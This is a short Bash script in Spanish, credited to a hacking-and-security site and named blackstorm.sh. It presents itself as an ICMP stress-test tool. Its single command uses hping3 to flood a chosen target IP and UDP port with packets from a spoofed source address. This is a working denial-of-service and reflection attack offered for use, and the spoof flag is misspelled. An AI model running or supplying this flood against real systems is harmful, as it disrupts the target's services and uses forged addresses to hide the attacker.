# !/bin/bash
# Herramienta de test de stress ICMP type 3 code 3 a partir de paquetes UDP elaborados con Hping3
# (C) hackingyseguridad.com 2021
# chmod 777 blackstorm.sh
# Uso: sh blackstorm.sh ip_target puerto_target ip_spoof
echo 
echo "UDP Flood con herramienta hping3 reflexión ICMP type 3 code 3"
echo "Uso: ./blackstorm.sh IP Puerto_UDP IP_spoof"
echo "Control + C para interrumpir"
echo 
hping3 $1 -2  -p $2 --spof $3 --flood $4
